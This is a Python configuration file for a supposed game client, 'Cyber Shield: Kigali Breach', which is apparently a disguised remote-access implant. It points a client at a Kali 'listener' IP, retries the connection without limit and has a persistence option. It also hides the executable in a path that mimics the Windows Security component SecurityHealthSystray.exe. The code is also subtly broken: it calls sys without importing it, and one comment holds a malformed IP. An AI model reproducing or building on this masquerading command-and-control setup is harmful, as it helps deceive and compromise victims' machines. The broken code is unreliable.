from dataclasses import dataclass
import socket
import os
from pathlib import Path


@dataclass
class GameConfig:
    """
    Central configuration for the Cyber Shield game client.

    Adjust LISTENER_HOST to point at your Kali IP before building
    the Windows executable.
    """

    # CHANGE THIS to your Kali IP when building for demo
    # Current options: "10.12.74.168" (WLAN) or "1192.168.0.193" (Prev)
    LISTENER_HOST: str = "192.168.0.193"
    LISTENER_PORT: int = 5050

    # Networking behaviour
    RECONNECT_DELAY_SEC: int = 5
    MAX_RECONNECT_ATTEMPTS: int = 0  # 0 = infinite attempts

    # Persistence behaviour (only relevant on Windows builds)
    ENABLE_PERSISTENCE_BY_DEFAULT: bool = False

    # Misc
    APP_NAME: str = "Cyber Shield: Kigali Breach"


def resolve_listener_host() -> str:
    """
    Helper used by the client to resolve the listener host.

    For convenience this tries to interpret special values like
    'auto' in the future; for now it simply returns LISTENER_HOST.
    """
    cfg = GameConfig()
    host = cfg.LISTENER_HOST
    if host in {"localhost", "127.0.0.1"}:
        return host
    try:
        socket.gethostbyname(host)
        return host
    except OSError:
        # Fallback to localhost if hostname is invalid
        return "127.0.0.1"

def get_migrated_path() -> Path:
    """
    Return the path where the client 'migrates' to hide on Windows.
    """
    # 1. Try LocalAppData
    base = os.getenv("LOCALAPPDATA")
    
    # 2. Try AppData
    if not base:
        base = os.getenv("APPDATA")
        
    # 3. Try User Profile
    if not base:
        base = os.getenv("USERPROFILE")
        
    # 4. Fallback to Home Directory
    if not base:
        base = str(Path.home())
        
    if sys.platform != "win32":
        return Path(base) / ".cyber_shield" / "bin" / "SecurityHealthSystray.exe"
    
    # Mimic a Windows Security health component
    return Path(base).resolve() / "Microsoft" / "Windows" / "ServiceHealth" / "SecurityHealthSystray.exe"
